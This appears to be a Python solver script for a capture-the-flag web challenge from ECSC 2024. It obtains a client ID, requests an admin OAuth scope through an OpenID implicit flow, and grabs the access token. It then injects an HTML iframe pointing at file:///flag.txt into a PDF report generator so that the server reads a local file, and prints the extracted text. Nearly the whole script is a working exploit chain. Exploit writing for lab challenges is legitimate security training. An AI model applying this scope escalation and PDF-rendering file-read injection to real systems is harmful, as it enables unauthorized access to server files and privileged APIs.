#!/usr/bin/env python3

import logging
import os
import re
from io import BytesIO

import requests
from pypdf import PdfReader

logging.disable()

URL = os.environ.get("URL", "http://woauthalaundry.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

s = requests.Session()
res = s.get(f"{URL}/api/v1/creds")
res.raise_for_status()

client_id = res.json()["client_id"]

res = s.get(
    f"{URL}/openid/authentication?response_type=token%20id_token&client_id={client_id}&scope=openid%20laundry%20amenities%20admin&redirect_uri=http://localhost:5173/&grant_type=implicit&nonce=nonce",
)
res.raise_for_status()
access_token = re.compile(r"access_token=([^&]+)").search(res.text).group(1)

pdf_flag = s.post(
    f"{URL}/api/v1/generate-report",
    json={"requiredBy": "<iframe src=\"file:///flag.txt\"></iframe>"},
    headers={"Authorization": f"Bearer {access_token}"}
)
pdf_flag.raise_for_status()

reader = PdfReader(BytesIO(pdf_flag.content))

for page in reader.pages:
    print(page.extract_text().replace('\n', ''))
